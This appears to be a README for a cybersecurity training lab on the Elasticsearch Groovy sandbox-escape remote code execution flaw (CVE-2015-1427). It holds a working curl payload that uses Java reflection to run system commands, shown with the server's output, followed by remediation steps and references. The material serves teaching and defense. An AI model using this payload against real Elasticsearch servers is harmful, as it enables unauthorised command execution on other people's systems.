# Elasticsearch Dynamic Scripting Engine Groovy / MVEL RCE (CVE-2015-1427)

## Overview

Elasticsearch vulnerability CVE-2015-1427 (and its predecessor CVE-2014-3120) is a famous remote code execution vulnerability affecting Elasticsearch versions prior to 1.4.3.

Elasticsearch allows search queries to execute dynamic scripts for calculating custom document scores and aggregations. In version 1.4.0, Elasticsearch replaced the MVEL scripting language with Groovy and introduced a Java SecurityManager-based sandbox to restrict script capabilities. However, due to flaws in how the Groovy class loader and reflection APIs were restricted, an unauthenticated attacker can craft a search query containing Groovy script expressions that leverage Java reflection to break out of the sandbox and execute arbitrary system commands on the host operating system.

- **Primary Interface**: TCP Port `9200` (`http://localhost:9200`)
- **Docker Shortcut**: `./lab start elasticsearch-rce`
- **Container Name**: `cyberlab_02_elasticsearch_rce`
- **RAM Footprint**: ~350 MB (OpenJDK 7 + Elasticsearch 1.4.2)

---

## Exploitation Walkthrough

### 1. Indexing a Test Document
Elasticsearch requires at least one document to exist in an index before running search scripts:

```bash
curl -X PUT 'http://localhost:9200/twitter/tweet/1' \
  -H "Content-Type: application/json" \
  -d '{"name": "test"}'
```

### 2. Executing Commands via Groovy Script Injection
Send a search query containing the reflection sandbox bypass payload:

```bash
curl -X POST 'http://localhost:9200/_search?pretty' \
  -H "Content-Type: application/json" \
  -d '{
    "size": 1,
    "script_fields": {
      "lupin": {
        "lang": "groovy",
        "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
      }
    }
  }'
```

The server returns:
```json
{
  "hits" : {
    "hits" : [ {
      "fields" : {
        "lupin" : [ "uid=1000(elasticsearch) gid=1000(elasticsearch) groups=1000(elasticsearch)\n" ]
      }
    } ]
  }
}
```

---

## Defensive Remediation & Hardening

1. **Disable Dynamic Scripting**:
   In older Elasticsearch versions, disable dynamic scripting inside `elasticsearch.yml`:
   ```yaml
   script.disable_dynamic: true
   ```
2. **Upgrade Elasticsearch**:
   Upgrade to modern Elasticsearch releases (7.x / 8.x). Modern versions utilize the Painless scripting language, which is strictly typed, sandboxed, and does not allow reflection.
3. **Bind to Private Networks**:
   Never expose Elasticsearch port 9200 publicly without authentication (Elasticsearch Security / X-Pack).

---

## Video Walkthroughs & Technical References

- [HackTheBox - Haystack](https://www.youtube.com/watch?v=wE1teFyD9GI)
- [Elastic Security Advisory CVE-2015-1427](https://www.elastic.co/community/security)
- [Vulhub Elasticsearch CVE-2015-1427 Advisory](https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/)
